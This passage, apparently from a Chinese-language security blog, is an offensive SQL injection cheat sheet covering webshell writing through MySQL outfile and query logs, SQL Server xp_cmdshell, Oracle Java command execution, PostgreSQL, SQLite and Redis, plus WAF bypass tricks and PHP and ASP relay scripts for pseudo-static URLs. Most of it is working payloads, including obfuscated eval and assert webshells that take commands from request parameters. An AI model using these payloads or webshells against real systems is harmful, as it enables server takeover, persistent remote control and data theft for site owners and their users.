<h6 id="基于UNION联合查询："><a href="#基于UNION联合查询：" class="headerlink" title="基于UNION联合查询："></a><strong>基于UNION联合查询</strong>：</h6><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 UNION ALL SELECT 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into outfile &#x27;C:\info.php&#x27;%23</span><br><span class="language-xml">?id=1 UNION ALL SELECT 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into dumpfile &#x27;C:\info.php&#x27;%23</span><br></code></pre></td></tr></table></figure>

<h6 id="非联合查询"><a href="#非联合查询" class="headerlink" title="非联合查询"></a><strong>非联合查询</strong></h6><p>当我们无法使用联合查询时，我们可以使用<code>fields terminated by</code>与<code>lines terminated by</code>来写shell</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 into outfile &#x27;C:\info.php&#x27; FIELDS TERMINATED BY &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br></code></pre></td></tr></table></figure>

<p><strong>代替空格的方法</strong><br>+号，<code>%0a</code>、<code>%0b</code>、<code>%a0</code> 、 &#x2F;**&#x2F; 注释符等<br><code>outfile</code>和<code>dumpfile</code>的区别</p>
<p><code>outfile</code>:</p>
<blockquote>
<p>1、 支持多行数据同时导出</p>
<p>2、 使用union联合查询时，要保证两侧查询的列数相同</p>
<p>3、 会在换行符制表符后面追加反斜杠</p>
<p>4、会在末尾追加换行</p>
</blockquote>
<p><code>dumpfile</code>:</p>
<blockquote>
<p>1、 每次只能导出一行数据</p>
<p>2、 不会在换行符制表符后面追加反斜杠</p>
<p>3、 不会在末尾追加换行</p>
</blockquote>
<p>因此，我们可以使用<code>into dumpfile</code>这个函数来顺利写入二进制文件;</p>
<p>当然<code>into outfile</code>函数也可以写入二进制文件，只是最终无法生效罢了（追加的反斜杠会使二进制文件无法生效）</p>
<p>如果服务器端本身的查询语句，结果有多行，但是我们又想使用<code>dump file</code>，应该手动添加 limit 限制</p>
<h4 id="突破secure-file-priv写shell"><a href="#突破secure-file-priv写shell" class="headerlink" title="突破secure-file-priv写shell"></a>突破<code>secure-file-priv</code>写shell</h4><p><code>MySQL</code>的<code>secure-file-priv</code>参数是用来限制LOAD DATA, SELECT … <code>OUTFILE</code>, and LOAD_FILE()传到哪个指定目录的。</p>
<p>当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>MySQL</code>的导入|导出做限制，如果是null，表示<code>MySQL</code>不允许导入导出。</p>
<p>而且在<code>mysql 5.6.34</code>版本以后 <code>secure_file_priv</code> 的值默认为NULL。并且无法用<code>SQL</code>语句对其进行修改。</p>
<h4 id="基于日志写shell"><a href="#基于日志写shell" class="headerlink" title="基于日志写shell"></a><strong>基于日志写shell</strong></h4><p>（ <code>outfile</code>被禁止，或者写入文件被拦截，没写权限 ，有root权限）</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">show variables like &#x27;%general%&#x27;;	--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="language-xml">set global general_log = on;		--开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="language-xml">set global general_log_file = &#x27;/var/www/html/info.php&#x27;;		--设置日志路径</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;		--执行查询，写入shell</span><br><span class="language-xml">--结束后，恢复日志路径，关闭日志监测</span><br><span class="language-xml"></span><br><span class="language-xml">--SQL查询免杀shell</span><br><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$sl</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;klion&#x27;</span>]);<span class="hljs-variable">$sl</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br><span class="language-xml"></span><br><span class="language-xml">SELECT &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;f&#x27;</span>=&gt;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;pffff&#x27;</span>=&gt;<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>=&gt;<span class="hljs-string">&#x27;fffff&#x27;</span>,<span class="hljs-string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;nnnnn&#x27;</span>=&gt;<span class="hljs-string">&#x27;t&#x27;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>];<span class="hljs-variable">$_</span>= <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-variable">$_</span>.<span class="hljs-string">&#x27;rt&#x27;</span>;<span class="hljs-variable">$_</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]));<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br></code></pre></td></tr></table></figure>

<h4 id="慢查询写shell"><a href="#慢查询写shell" class="headerlink" title="慢查询写shell"></a>慢查询写shell</h4><p>为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错<br>show variables like ‘%slow_query_log%’;		–查看慢查询信息<br>set global slow_query_log&#x3D;1;				–启用慢查询日志(默认禁用)<br>set global slow_query_log_file&#x3D;’C:\phpStudy\WWW\shell.php’;	–修改日志文件路径<br>select ‘<?php @eval($_POST[abc]);?>‘ or sleep(11);				–写shell</p>
<h5 id="慢查询补充"><a href="#慢查询补充" class="headerlink" title="慢查询补充"></a><strong>慢查询补充</strong></h5><p>因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。</p>
<p>一般都是通过<code>long_query_time</code>选项来设置这个时间值，时间以秒为单位，可以精确到微秒。</p>
<p>如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%long_query_time%&#x27;</span>		<span class="hljs-comment">--查看服务器默认时间值</span><br></code></pre></td></tr></table></figure>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<br><span class="hljs-keyword">select</span> <span class="hljs-number">0x3c3f70687020a6576616c28245f504f53545b615d293ba3f3e</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span><br><br><span class="hljs-keyword">Sql</span> server<br>存储过程xp_cmdshell<br>;<span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; D:\\WWW\\2333.aspx&#x27;</span> ;<span class="hljs-comment">--</span><br><br>Oracle<br><span class="hljs-number">1</span>、创建JAVA包<br><span class="hljs-keyword">select</span> dbms_xmlquery.newcontext(<span class="hljs-string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br><span class="hljs-number">2</span>、JAVA权限<br><span class="hljs-keyword">select</span> dbms_xmlquery.newcontext(<span class="hljs-string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;begin dbms_java.grant_permission( &#x27;&#x27;&#x27;&#x27;SYSTEM&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;EXECUTE&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;commit;end;&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br><span class="hljs-number">3</span>、创建函数<br><span class="hljs-keyword">select</span> dbms_xmlquery.newcontext(<span class="hljs-string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br>URL执行<br>id<span class="hljs-operator">=</span><span class="hljs-number">602</span><span class="hljs-string">&#x27;||utl_inadd.get_host_name((select LinxRUNCMD(&#x27;</span>cmd <span class="hljs-operator">/</span>c dir d:<span class="hljs-operator">/</span><span class="hljs-string">&#x27;) from dual))--</span><br><span class="hljs-string"></span><br><span class="hljs-string">postgresql</span><br><span class="hljs-string">COPY (select &#x27;</span><span class="hljs-operator">&lt;</span>?php phpinfo();?<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;) to &#x27;</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span><span class="hljs-number">1.</span>php<span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">sqlite3</span><br><span class="hljs-string">;attach database &#x27;</span>D:\\www\\<span class="hljs-number">008.</span>php<span class="hljs-string">&#x27; as tt;create TABLE tt.exp (dataz text) ; insert INTO tt.exp (dataz) VALUES (x&#x27;</span><span class="hljs-number">3</span>c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">redis</span><br><span class="hljs-string">%0D%0Aconfig%20set%20dir%20%2Fvar%2Fwww%2Fhtml2F%0D%0Aconfig%20set%20dbfilename%20shell%2Ephp%0D%0Aset%20x%2022%3C%3Fphp%20phpinfo%28%29%3B%%203F%3E%22%0D%0Asave%0D%0A</span><br></code></pre></td></tr></table></figure>
<p>当然如果你懒得手动打，你直接sqlmap后面加个–os-shell就行</p>
<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><h4 id="MD5万能密码"><a href="#MD5万能密码" class="headerlink" title="MD5万能密码"></a>MD5万能密码</h4><p>select * from ‘admin’ where password&#x3D;md5($pass,true)</p>
<p>这里面password就是我们用户框中输入得东西。如果通过md5之后返回字符串是’or 1的话，形成一个永真条件，</p>
<p>select * from ‘admin’ where password&#x3D;’  ‘or  ‘6…’</p>
<p>看了大佬博客，这个可以用ffifdyop绕过，绕过原理是： ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6 而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password&#x3D;’’ or ‘6xxxxx’，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p>
<h3 id="通配符注入"><a href="#通配符注入" class="headerlink" title="通配符注入"></a>通配符注入</h3><p>在 SQL 中，LIKE是一个强大的匹配操作符，用于在WHERE子句中对列名进行模糊搜索，它通常与通配符一起使用，以提供更灵活的匹配条件。</p>
<p>通配符是一种特殊字符，用于在搜索或匹配字符串时表示一个或多个真正的字符。在SQL中，LIKE操作符经常与两个通配符（%和_）一起使用，以提供更灵活的匹配条件。</p>
<p>百分号（%）表示零个或任意个字符，可以匹配任意类型和长度的字符，包括中文等非ASCII字符。下划线（_）则表示任意单个字符，匹配单个任意字符，通常用来限制表达式的字符长度。</p>
<h1 id="SQLBypass"><a href="#SQLBypass" class="headerlink" title="SQLBypass"></a>SQLBypass</h1><h2 id="HTTP协议绕过"><a href="#HTTP协议绕过" class="headerlink" title="HTTP协议绕过"></a>HTTP协议绕过</h2><h3 id="1-协议未覆盖"><a href="#1-协议未覆盖" class="headerlink" title="1.协议未覆盖"></a>1.协议未覆盖</h3><p>WAF未能覆盖Content-Type，从而导致被绕过。或者WAF认为这是一个文件上传请求，从而只检测文件上传，导致绕过<br>POST请求：<br>Content-Type:application&#x2F;x-www-from-urlencoded<br>Content-Type:multipary&#x2F;from-data<br>Content-Type:application&#x2F;json<br>Content-Type:application&#x2F;xml</p>
<h3 id="2-HTTP-1-x与HTTP-2差异绕过WAF-对云WAF无效"><a href="#2-HTTP-1-x与HTTP-2差异绕过WAF-对云WAF无效" class="headerlink" title="2.HTTP&#x2F;1.x与HTTP&#x2F;2差异绕过WAF(对云WAF无效)"></a>2.HTTP&#x2F;1.x与HTTP&#x2F;2差异绕过WAF(对云WAF无效)</h3><p>HTTP&#x2F;2提供了更高效的传输方式和更多的特性，WAF可能没有对HTTP&#x2F;2协议请求进行充分检测或者不支持HTTP&#x2F;2</p>
<h3 id="3-分块编码传输"><a href="#3-分块编码传输" class="headerlink" title="3.分块编码传输"></a>3.分块编码传输</h3><p>chunked-coding-converter</p>
<h3 id="4-HTTP参数污染绕过"><a href="#4-HTTP参数污染绕过" class="headerlink" title="4.HTTP参数污染绕过"></a>4.HTTP参数污染绕过</h3><p>TP参数污染，也叫HPP（HTTP Parameter Pollution）。当给一个参数赋两个值或者更多的值时，服务器对多次赋值参数的数据处理也是不同的，根据这个特征，可以对某些防护设备进行绕过。</p>
<p>这里后端取值是第3位的id，如果waf 取值是第一位检测那么就会导致绕过。</p>
<h3 id="5-HTTP参数溢出绕过"><a href="#5-HTTP参数溢出绕过" class="headerlink" title="5.HTTP参数溢出绕过"></a>5.HTTP参数溢出绕过</h3><p>WAF为了避免参数污染的绕过会检测所有的参数，但是有些WAF因为性能会有数量限制，如果WAF只检测前500个参数，攻击者可以将参数数量增加到501个，所有参数都使用不相同的参数名。<br>由于WAF只检测前500个参数，第501个参数就可以绕过WAF的检测。</p>
<h2 id="大小写混写绕过"><a href="#大小写混写绕过" class="headerlink" title="大小写混写绕过"></a>大小写混写绕过</h2><p>有些WAF默认情况下可能是大小写敏感的，因此这种方式可能会绕过检测。正则被绕过：<br>比如：<br><code>他的正则是union.*？select</code><br>你的payload是：UnIon sElect<br>就可以被绕过</p>
<h2 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h2><p>在某些情况下，特定的函数方法或正则表达式可能会替换或删除其中的关键字，比如：uniunionon selselectect ，它后端的过滤函数会根据正则去清洗掉，这个时候就会还原成union select，需要注意的是他可能会递归的删除且有一定的次数，比如ununionunionunionunionunionion 最后还原成union，这时候递归最大深度为5，也就是说最后payload 是需要替换5次</p>
<h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>使用反引号，可以用来过空格和正则</p>
<p>`updatexml`(1,1,1)</p>
<p>科学计数法利用来做连接符号可以的躲避union select等组合规则</p>
<p>select 1,2 and 1&#x3D;1.e5union select 1,2</p>
<p>select后面可以接一些（+,-,!,~,”,’）特殊字符来干扰waf对select 1,2,3 的拦截</p>
<p>select~1,2,3</p>
<p>select!1,2,3</p>
<p>select-1,2,3</p>
<p>select+1,2,3</p>
<p>select”1”,2,3</p>
<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>十六进制，unicode，url</p>
<p>select * from users where username&#x3D;0x十六进制字符</p>
<h2 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h2><p>空格被过滤时可以使用注释&#x2F;**&#x2F;,内联注释&#x2F;<em>!12345</em>&#x2F;,– +xxx%0a,%23xxxx%0a, %09,%0A,%0C,%0D,%20 这些字符去替代.<br>过滤or and 可以使用逻辑运算符替代<br>and &#x3D; &amp;&amp;<br>or &#x3D; ||<br>有些场景过滤了逗号，导致无法使用部分函数，比如<br>substr(“123”,1,1); 过滤了,导致无法使用，我可以使用</p>
<p>from pos for len来取代substr(“123” from 1 for 1)</p>
<p>当database(),version(),user()等系统函数被过滤的场景可以使用@@ version，@@user等方式替换database可以采用内联注释或结合特殊字符来绕过。</p>
<p>当if等判断条件无法使用的时候，去寻找可用的对比函数，<br>比如locate 。<br>LOCATE 函数用于查找一个子字符串在另一个字符串中的位置。</p>
<p>当字符截取函数被禁用的场景下可以使用between and操作符 来进行盲注。<br>操作符 BETWEEN … AND 会选取介于两个值之间的数据范围。<br>可以按照abcdefghyjklmnopqrstuvwsyz 的范围盲枚举字符</p>
<p>Trim的艺术。<br>trim函数可以过滤指定的字符串：<br>完整格式：TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM] str)<br>简化格式：TRIM([remstr FROM] str)<br>BOTH 表示从字符串的开头和结尾去除，LEADING 表示从字符串的开头去除，<br>TRAILING 表示从字符串的结尾去除。如果未指定，默认为 BOTH。</p>
<p>Bypass information_schema<br>当information_schema被拦截的时候可以尝试<br>sys.schema_auto_increment_columns<br>sys.schema_table_statistics_with_buffer<br>select group_concat(table_name) from sys.schema_auto_increment_columns where<br>table_schema&#x3D;database()<br>select group_concat(table_name) from sys.schema_table_statistics_with_buffer where<br>table_schema&#x3D;database()<br>类似的表还有 mysql.innodb_table_stats、mysql_innodb_table_index都存放有库名和表名<br>限制条件<br>数据库版本要大于5.7<br>权限问题：要求权限高，root用户才能够访问<br>也可以使用另一个库performance_schema<br>select GROUP_CONCAT(OBJECT_NAME) from<br>performance_schema.table_io_waits_summary_by_table where OBJECT_SCHEMA&#x3D;database()</p>
<h2 id="容器特性"><a href="#容器特性" class="headerlink" title="容器特性"></a>容器特性</h2><p>iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，</p>
<p>解析出来还是select<br>iis+asp 的unicode特性 :iis支持Unicode的解析 我们传入<br>s%u0065lect解析为select</p>
<p>HPP参数污染</p>
<p>很多后端语言的json解析器会对特定编码做解析，可以<br>尝试utf-7, Unicode等编码做操作</p>
<h2 id="缓冲溢出"><a href="#缓冲溢出" class="headerlink" title="缓冲溢出"></a>缓冲溢出</h2><p>WAF在处理payload时超出了其缓冲区长度，可能就会引发崩溃之类的从而实现绕过</p>
<p>select 1 and (select 1)&#x3D;(select 0xB*0xB*0xB*0xB*0xB*0xB*0xB*0xB*0xB*0xB*0xB*0xB*) UnIoN SeLect 1</p>
<p>select 1 and (select 1)&#x3D;(select 0xB*9999999999999999999999999) UnIoN SeLect 1</p>
<h1 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h1><h2 id="伪静态的区分"><a href="#伪静态的区分" class="headerlink" title="伪静态的区分"></a>伪静态的区分</h2><p>在浏览器里控制台（console),输入代码或粘贴js代码</p>
<p>alert(document.lastModified); 回车执行，会弹出一个弹窗。</p>
<p>重新刷新网页，再用相同的方法在控制台里输入查询代码，再查看文件的最后修改时间，如果发现<strong>时间不同</strong>则可以判断它是伪静态。（时间不是现在也很有可能）</p>
<p>如果是伪静态页面，可以尝试将其变成动态页面。伪静态的话只是由动态转成了静态，从地址上你是可以看到转递参数的，比如phpweb，它的链接是这样的：news&#x2F;?123.html，这个你可以理解成news.php?id&#x3D;123。所以你可以news&#x2F;?123*.html这样提交。或者可以进行伪静态中转。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jsq16/p/5942003.html#:~:text=%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93.">伪静态注入的总结 - 无法自拔 - 博客园 (cnblogs.com)</a></p>
<h2 id="入侵的大概思维方式"><a href="#入侵的大概思维方式" class="headerlink" title="入侵的大概思维方式"></a>入侵的大概思维方式</h2><p>对搜索框进行测试（注入测试） 对登录处进行测试（万能密码、注入） 对站点进行目录扫描（发现其他突破口） 从C段下手</p>
<h3 id="一：中转注入法"><a href="#一：中转注入法" class="headerlink" title="一：中转注入法"></a>一：中转注入法</h3><p>1.通过<a target="_blank" rel="noopener" href="http://www.xxx.com/news.php?id=1%E5%81%9A%E4%BA%86%E4%BC%AA%E9%9D%99%E6%80%81%E4%B9%8B%E5%90%8E%E5%B0%B1%E6%88%90%E8%BF%99%E6%A0%B7%E4%BA%86">http://www.xxx.com/news.php?id=1做了伪静态之后就成这样了</a></p>
<p><a target="_blank" rel="noopener" href="http://www.xxx.com/news.php/id/1.html">http://www.xxx.com/news.php/id/1.html</a></p>
<p>2.测试步骤：</p>
<p>中转注入的php代码:inject.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>];  <br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(” “,”%<span class="hljs-number">20</span>″,<span class="hljs-variable">$id</span>);  <br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(“=”,”%<span class="hljs-number">3</span>D”,<span class="hljs-variable">$id</span>);  <br><span class="hljs-comment">//$url = &quot;http://www.xxx.com/news.php/id/$id.html&quot;;  </span><br><span class="hljs-variable">$url </span>= <span class="hljs-string">&quot;http://www.xxx.com/news.php/id/<span class="hljs-subst">$id</span>.html&quot;</span>;  <br><span class="hljs-comment">//echo $url;  </span><br>   <br><span class="hljs-variable">$ch </span>= <span class="hljs-title function_ invoke__">curl_init</span>();  <br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-string">&quot;<span class="hljs-subst">$url</span>&quot;</span>);  <br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);  <br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);  <br>   <br><span class="hljs-variable">$output </span>= <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);  <br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);  <br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$output</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>3.本地环境搭建PHP，然后访问<a target="_blank" rel="noopener" href="http://127.0.0.1/inject.php?id=1">http://127.0.0.1/inject.php?id=1</a></p>
<p>通过sqlmap或者havj可以跑注入漏洞。</p>
<p><strong>附录ASP中转代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs asp">&lt;strong&gt;&lt;font style=&quot;font-size: 12pt&quot;&gt;&lt;code id=&quot;code1&quot;&gt;&lt;%  <br>JmdcwName=request(&quot;id&quot;)  <br>JmStr=JmdcwName  <br>JmStr=URLEncoding(JmStr)  <br>JMUrl=&quot;http://192.168.235.7:8808/ad/blog/&quot;  //实际上要请求的网址  <br>JMUrl=JMUrl &amp; JmStr&amp;&quot;.html&quot;    //拼接url  <br>response.write JMUrl&amp;JmStr    //我这里故意输出url来看  <br>&#x27;JmRef=&quot;http://127.0.0.1/6kbbs/bank.asp&quot;  <br>JmCok=&quot;&quot;  <br>JmCok=replace(JmCok,chr(32),&quot;%20&quot;)  <br>JmStr=URLEncoding(JmStr)    <br>  <br>response.write  PostData(JMUrl,JmStr,JmCok,JmRef) //url,查询字符串，cookie，referer字段  <br>  <br>Function PostData(PostUrl,PostStr,PostCok,PostRef)    <br>Dim Http  <br>Set Http = Server.CreateObject(&quot;msxml2.serverXMLHTTP&quot;)  <br>With Http  <br>.Open &quot;GET&quot;,PostUrl,False  <br>.Send ()  <br>PostData = .ResponseBody  <br>End With  <br>Set Http = Nothing  <br>PostData =bytes2BSTR(PostData)  <br>End Function  <br>  <br>  <br>Function bytes2BSTR(vIn)   //处理返回的信息  <br>Dim strReturn  <br>Dim I, ThisCharCode, NextCharCode  <br>strReturn = &quot;&quot;  <br>For I = 1 To LenB(vIn)  <br>ThisCharCode = AscB(MidB(vIn, I, 1))  <br>If ThisCharCode &lt; &amp;H80 Then  <br>strReturn = strReturn &amp; Chr(ThisCharCode)  <br>Else  <br>NextCharCode = AscB(MidB(vIn, I + 1, 1))  <br>strReturn = strReturn &amp; Chr(CLng(ThisCharCode) * &amp;H100 + CInt(NextCharCode))  <br>I = I + 1  <br>End If  <br>Next  <br>bytes2BSTR = strReturn  <br>End Function  <br>  <br>Function URLEncoding(vstrin)    //发包前对参数的url编码一下  <br>strReturn=&quot;&quot;  <br>Dim i  <br>&#x27;vstrin=replace(vstrin,&quot;%&quot;,&quot;%25&quot;) &#x27;增加转换搜索字符,  <br>&#x27;vstrin=Replace(vstrin,chr(32),&quot;%20&quot;) &#x27;转换空格,如果网站过滤了空格,尝试用/**/来代替%20  <br>&#x27;vstrin=Replace(vstrin,chr(43),&quot;%2B&quot;)  &#x27;JMDCW增加转换+字符  <br>vstrin=Replace(vstrin,chr(32),&quot;/**/&quot;)  &#x27;在此增加要过滤的代码 //这里很关键，方便啊，把空格自动换成/**/，后面会说到的  <br>For i=1 To Len(vstrin)  